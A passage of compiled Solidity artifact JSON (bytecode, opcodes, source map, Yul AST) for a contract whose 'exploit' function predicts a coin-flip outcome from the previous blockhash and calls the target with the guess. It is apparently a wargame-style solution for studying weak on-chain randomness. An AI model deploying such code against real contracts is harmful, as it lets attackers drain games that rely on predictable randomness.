							"object": "60806040527f8000000000000000000000000000000000000000000000000000000000000000600155348015610033575f5ffd5b50604051610488380380610488833981810160405281019061005591906100f9565b8060025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610124565b5f5ffd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100c88261009f565b9050919050565b6100d8816100be565b81146100e2575f5ffd5b50565b5f815190506100f3816100cf565b92915050565b5f6020828403121561010e5761010d61009b565b5b5f61011b848285016100e5565b91505092915050565b610357806101315f395ff3fe608060405234801561000f575f5ffd5b5060043610610029575f3560e01c806363d9b7701461002d575b5f5ffd5b610035610037565b005b5f6001436100459190610205565b405f1c9050805f5403610056575f5ffd5b805f819055505f6001548261006b9190610265565b90505f6001821461007c575f61007f565b60015b9050600115158115150361012e5760025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f6760016040518263ffffffff1660e01b81526004016100e891906102af565b6020604051808303815f875af1158015610104573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061012891906102f6565b506101ca565b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16631d263f675f6040518263ffffffff1660e01b815260040161018891906102af565b6020604051808303815f875af11580156101a4573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101c891906102f6565b505b505050565b5f819050919050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f61020f826101cf565b915061021a836101cf565b9250828203905081811115610232576102316101d8565b5b92915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601260045260245ffd5b5f61026f826101cf565b915061027a836101cf565b92508261028a57610289610238565b5b828204905092915050565b5f8115159050919050565b6102a981610295565b82525050565b5f6020820190506102c25f8301846102a0565b92915050565b5f5ffd5b6102d581610295565b81146102df575f5ffd5b50565b5f815190506102f0816102cc565b92915050565b5f6020828403121561030b5761030a6102c8565b5b5f610318848285016102e2565b9150509291505056fea26469706673582212202f488e115fc89ea40ddfe1057ebe35af5d437f9b1e55f2ea48f4f7cc0585fba764736f6c634300081c0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH32 0x8000000000000000000000000000000000000000000000000000000000000000 PUSH1 0x1 SSTORE CALLVALUE DUP1 ISZERO PUSH2 0x33 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x488 CODESIZE SUB DUP1 PUSH2 0x488 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x55 SWAP2 SWAP1 PUSH2 0xF9 JUMP JUMPDEST DUP1 PUSH1 0x2 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x124 JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xC8 DUP3 PUSH2 0x9F JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xD8 DUP2 PUSH2 0xBE JUMP JUMPDEST DUP2 EQ PUSH2 0xE2 JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xF3 DUP2 PUSH2 0xCF JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x10E JUMPI PUSH2 0x10D PUSH2 0x9B JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x11B DUP5 DUP3 DUP6 ADD PUSH2 0xE5 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x357 DUP1 PUSH2 0x131 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x29 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x63D9B770 EQ PUSH2 0x2D JUMPI JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x35 PUSH2 0x37 JUMP JUMPDEST STOP JUMPDEST PUSH0 PUSH1 0x1 NUMBER PUSH2 0x45 SWAP2 SWAP1 PUSH2 0x205 JUMP JUMPDEST BLOCKHASH PUSH0 SHR SWAP1 POP DUP1 PUSH0 SLOAD SUB PUSH2 0x56 JUMPI PUSH0 PUSH0 REVERT JUMPDEST DUP1 PUSH0 DUP2 SWAP1 SSTORE POP PUSH0 PUSH1 0x1 SLOAD DUP3 PUSH2 0x6B SWAP2 SWAP1 PUSH2 0x265 JUMP JUMPDEST SWAP1 POP PUSH0 PUSH1 0x1 DUP3 EQ PUSH2 0x7C JUMPI PUSH0 PUSH2 0x7F JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP PUSH1 0x1 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x12E JUMPI PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH1 0x1 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xE8 SWAP2 SWAP1 PUSH2 0x2AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x104 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x128 SWAP2 SWAP1 PUSH2 0x2F6 JUMP JUMPDEST POP PUSH2 0x1CA JUMP JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x1D263F67 PUSH0 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x188 SWAP2 SWAP1 PUSH2 0x2AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1A4 JUMPI RETURNDATASIZE PUSH0 PUSH0 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x1C8 SWAP2 SWAP1 PUSH2 0x2F6 JUMP JUMPDEST POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x20F DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP2 POP PUSH2 0x21A DUP4 PUSH2 0x1CF JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0x232 JUMPI PUSH2 0x231 PUSH2 0x1D8 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0x26F DUP3 PUSH2 0x1CF JUMP JUMPDEST SWAP2 POP PUSH2 0x27A DUP4 PUSH2 0x1CF JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x28A JUMPI PUSH2 0x289 PUSH2 0x238 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2A9 DUP2 PUSH2 0x295 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x2C2 PUSH0 DUP4 ADD DUP5 PUSH2 0x2A0 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH0 REVERT JUMPDEST PUSH2 0x2D5 DUP2 PUSH2 0x295 JUMP JUMPDEST DUP2 EQ PUSH2 0x2DF JUMPI PUSH0 PUSH0 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x2F0 DUP2 PUSH2 0x2CC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x30B JUMPI PUSH2 0x30A PUSH2 0x2C8 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x318 DUP5 DUP3 DUP6 ADD PUSH2 0x2E2 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x2F BASEFEE DUP15 GT PUSH0 0xC8 SWAP15 LOG4 0xD 0xDF 0xE1 SDIV PUSH31 0xBE35AF5D437F9B1E55F2EA48F4F7CC0585FBA764736F6C634300081C003300 ",
							"sourceMap": "87:759:1:-:0;;;150:77;133:94;;254:73;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;313:6;296:5;;:24;;;;;;;;;;;;;;;;;;254:73;87:759;;88:117:2;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;87:759:1:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@exploit_165": {
									"entryPoint": 55,
									"id": 165,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_decode_t_bool_fromMemory": {
									"entryPoint": 738,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_decode_tuple_t_bool_fromMemory": {
									"entryPoint": 758,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_bool_to_t_bool_fromStack": {
									"entryPoint": 672,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed": {
									"entryPoint": 687,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"allocate_unbounded": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 1
								},
								"checked_div_t_uint256": {
									"entryPoint": 613,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"checked_sub_t_uint256": {
									"entryPoint": 517,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_bool": {
									"entryPoint": 661,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 463,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"panic_error_0x11": {
									"entryPoint": 472,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"panic_error_0x12": {
									"entryPoint": 568,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 712,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"validator_revert_t_bool": {
									"entryPoint": 716,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nativeSrc": "0:2220:2",
										"nodeType": "YulBlock",
										"src": "0:2220:2",
										"statements": [
											{
												"body": {
													"nativeSrc": "52:32:2",
													"nodeType": "YulBlock",
													"src": "52:32:2",
													"statements": [
														{
															"nativeSrc": "62:16:2",
															"nodeType": "YulAssignment",
															"src": "62:16:2",
															"value": {
																"name": "value",
																"nativeSrc": "73:5:2",
																"nodeType": "YulIdentifier",
																"src": "73:5:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "62:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nativeSrc": "7:77:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "34:5:2",
														"nodeType": "YulTypedName",
														"src": "34:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "44:7:2",
														"nodeType": "YulTypedName",
														"src": "44:7:2",
														"type": ""
													}
												],
												"src": "7:77:2"
											},
											{
												"body": {
													"nativeSrc": "118:152:2",
													"nodeType": "YulBlock",
													"src": "118:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "135:1:2",
																		"nodeType": "YulLiteral",
																		"src": "135:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "138:77:2",
																		"nodeType": "YulLiteral",
																		"src": "138:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "128:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "128:6:2"
																},
																"nativeSrc": "128:88:2",
																"nodeType": "YulFunctionCall",
																"src": "128:88:2"
															},
															"nativeSrc": "128:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "128:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "232:1:2",
																		"nodeType": "YulLiteral",
																		"src": "232:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "235:4:2",
																		"nodeType": "YulLiteral",
																		"src": "235:4:2",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "225:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "225:6:2"
																},
																"nativeSrc": "225:15:2",
																"nodeType": "YulFunctionCall",
																"src": "225:15:2"
															},
															"nativeSrc": "225:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "225:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "256:1:2",
																		"nodeType": "YulLiteral",
																		"src": "256:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "259:4:2",
																		"nodeType": "YulLiteral",
																		"src": "259:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "249:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "249:6:2"
																},
																"nativeSrc": "249:15:2",
																"nodeType": "YulFunctionCall",
																"src": "249:15:2"
															},
															"nativeSrc": "249:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "249:15:2"
														}
													]
												},
												"name": "panic_error_0x11",
												"nativeSrc": "90:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "90:180:2"
											},
											{
												"body": {
													"nativeSrc": "321:149:2",
													"nodeType": "YulBlock",
													"src": "321:149:2",
													"statements": [
														{
															"nativeSrc": "331:25:2",
															"nodeType": "YulAssignment",
															"src": "331:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "354:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "354:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "336:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "336:17:2"
																},
																"nativeSrc": "336:20:2",
																"nodeType": "YulFunctionCall",
																"src": "336:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "331:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "331:1:2"
																}
															]
														},
														{
															"nativeSrc": "365:25:2",
															"nodeType": "YulAssignment",
															"src": "365:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "388:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "388:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "370:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "370:17:2"
																},
																"nativeSrc": "370:20:2",
																"nodeType": "YulFunctionCall",
																"src": "370:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "365:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "365:1:2"
																}
															]
														},
														{
															"nativeSrc": "399:17:2",
															"nodeType": "YulAssignment",
															"src": "399:17:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "411:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "411:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "414:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "414:1:2"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nativeSrc": "407:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "407:3:2"
																},
																"nativeSrc": "407:9:2",
																"nodeType": "YulFunctionCall",
																"src": "407:9:2"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nativeSrc": "399:4:2",
																	"nodeType": "YulIdentifier",
																	"src": "399:4:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "441:22:2",
																"nodeType": "YulBlock",
																"src": "441:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nativeSrc": "443:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "443:16:2"
																			},
																			"nativeSrc": "443:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "443:18:2"
																		},
																		"nativeSrc": "443:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "443:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "diff",
																		"nativeSrc": "432:4:2",
																		"nodeType": "YulIdentifier",
																		"src": "432:4:2"
																	},
																	{
																		"name": "x",
																		"nativeSrc": "438:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "438:1:2"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nativeSrc": "429:2:2",
																	"nodeType": "YulIdentifier",
																	"src": "429:2:2"
																},
																"nativeSrc": "429:11:2",
																"nodeType": "YulFunctionCall",
																"src": "429:11:2"
															},
															"nativeSrc": "426:37:2",
															"nodeType": "YulIf",
															"src": "426:37:2"
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nativeSrc": "276:194:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "307:1:2",
														"nodeType": "YulTypedName",
														"src": "307:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "310:1:2",
														"nodeType": "YulTypedName",
														"src": "310:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nativeSrc": "316:4:2",
														"nodeType": "YulTypedName",
														"src": "316:4:2",
														"type": ""
													}
												],
												"src": "276:194:2"
											},
											{
												"body": {
													"nativeSrc": "504:152:2",
													"nodeType": "YulBlock",
													"src": "504:152:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "521:1:2",
																		"nodeType": "YulLiteral",
																		"src": "521:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "524:77:2",
																		"nodeType": "YulLiteral",
																		"src": "524:77:2",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "514:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "514:6:2"
																},
																"nativeSrc": "514:88:2",
																"nodeType": "YulFunctionCall",
																"src": "514:88:2"
															},
															"nativeSrc": "514:88:2",
															"nodeType": "YulExpressionStatement",
															"src": "514:88:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "618:1:2",
																		"nodeType": "YulLiteral",
																		"src": "618:1:2",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "621:4:2",
																		"nodeType": "YulLiteral",
																		"src": "621:4:2",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nativeSrc": "611:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "611:6:2"
																},
																"nativeSrc": "611:15:2",
																"nodeType": "YulFunctionCall",
																"src": "611:15:2"
															},
															"nativeSrc": "611:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "611:15:2"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nativeSrc": "642:1:2",
																		"nodeType": "YulLiteral",
																		"src": "642:1:2",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nativeSrc": "645:4:2",
																		"nodeType": "YulLiteral",
																		"src": "645:4:2",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nativeSrc": "635:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "635:6:2"
																},
																"nativeSrc": "635:15:2",
																"nodeType": "YulFunctionCall",
																"src": "635:15:2"
															},
															"nativeSrc": "635:15:2",
															"nodeType": "YulExpressionStatement",
															"src": "635:15:2"
														}
													]
												},
												"name": "panic_error_0x12",
												"nativeSrc": "476:180:2",
												"nodeType": "YulFunctionDefinition",
												"src": "476:180:2"
											},
											{
												"body": {
													"nativeSrc": "704:143:2",
													"nodeType": "YulBlock",
													"src": "704:143:2",
													"statements": [
														{
															"nativeSrc": "714:25:2",
															"nodeType": "YulAssignment",
															"src": "714:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "737:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "737:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "719:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "719:17:2"
																},
																"nativeSrc": "719:20:2",
																"nodeType": "YulFunctionCall",
																"src": "719:20:2"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nativeSrc": "714:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "714:1:2"
																}
															]
														},
														{
															"nativeSrc": "748:25:2",
															"nodeType": "YulAssignment",
															"src": "748:25:2",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "771:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "771:1:2"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nativeSrc": "753:17:2",
																	"nodeType": "YulIdentifier",
																	"src": "753:17:2"
																},
																"nativeSrc": "753:20:2",
																"nodeType": "YulFunctionCall",
																"src": "753:20:2"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nativeSrc": "748:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "748:1:2"
																}
															]
														},
														{
															"body": {
																"nativeSrc": "795:22:2",
																"nodeType": "YulBlock",
																"src": "795:22:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nativeSrc": "797:16:2",
																				"nodeType": "YulIdentifier",
																				"src": "797:16:2"
																			},
																			"nativeSrc": "797:18:2",
																			"nodeType": "YulFunctionCall",
																			"src": "797:18:2"
																		},
																		"nativeSrc": "797:18:2",
																		"nodeType": "YulExpressionStatement",
																		"src": "797:18:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nativeSrc": "792:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "792:1:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "785:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "785:6:2"
																},
																"nativeSrc": "785:9:2",
																"nodeType": "YulFunctionCall",
																"src": "785:9:2"
															},
															"nativeSrc": "782:35:2",
															"nodeType": "YulIf",
															"src": "782:35:2"
														},
														{
															"nativeSrc": "827:14:2",
															"nodeType": "YulAssignment",
															"src": "827:14:2",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nativeSrc": "836:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "836:1:2"
																	},
																	{
																		"name": "y",
																		"nativeSrc": "839:1:2",
																		"nodeType": "YulIdentifier",
																		"src": "839:1:2"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nativeSrc": "832:3:2",
																	"nodeType": "YulIdentifier",
																	"src": "832:3:2"
																},
																"nativeSrc": "832:9:2",
																"nodeType": "YulFunctionCall",
																"src": "832:9:2"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nativeSrc": "827:1:2",
																	"nodeType": "YulIdentifier",
																	"src": "827:1:2"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nativeSrc": "662:185:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nativeSrc": "693:1:2",
														"nodeType": "YulTypedName",
														"src": "693:1:2",
														"type": ""
													},
													{
														"name": "y",
														"nativeSrc": "696:1:2",
														"nodeType": "YulTypedName",
														"src": "696:1:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nativeSrc": "702:1:2",
														"nodeType": "YulTypedName",
														"src": "702:1:2",
														"type": ""
													}
												],
												"src": "662:185:2"
											},
											{
												"body": {
													"nativeSrc": "895:48:2",
													"nodeType": "YulBlock",
													"src": "895:48:2",
													"statements": [
														{
															"nativeSrc": "905:32:2",
															"nodeType": "YulAssignment",
															"src": "905:32:2",
															"value": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nativeSrc": "930:5:2",
																				"nodeType": "YulIdentifier",
																				"src": "930:5:2"
																			}
																		],
																		"functionName": {
																			"name": "iszero",
																			"nativeSrc": "923:6:2",
																			"nodeType": "YulIdentifier",
																			"src": "923:6:2"
																		},
																		"nativeSrc": "923:13:2",
																		"nodeType": "YulFunctionCall",
																		"src": "923:13:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nativeSrc": "916:6:2",
																	"nodeType": "YulIdentifier",
																	"src": "916:6:2"
																},
																"nativeSrc": "916:21:2",
																"nodeType": "YulFunctionCall",
																"src": "916:21:2"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nativeSrc": "905:7:2",
																	"nodeType": "YulIdentifier",
																	"src": "905:7:2"
																}
															]
														}
													]
												},
												"name": "cleanup_t_bool",
												"nativeSrc": "853:90:2",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nativeSrc": "877:5:2",
														"nodeType": "YulTypedName",
														"src": "877:5:2",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nativeSrc": "887:7:2",
														"nodeType": "YulTypedName",
														"src": "887:7:2",
														"type": ""
													}
												],
												"src": "853:90:2"
											},
											{
												"body": {
													"nativeSrc": "1008:50:2",
													"nodeType": "YulBlock",
													"src": "1008:50:2",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nativeSrc": "1025:3:2",
																		"nodeType": "YulIdentifier",
																		"src": "1025:3:2"
																	},
																	{
																		"arguments": [
																			{
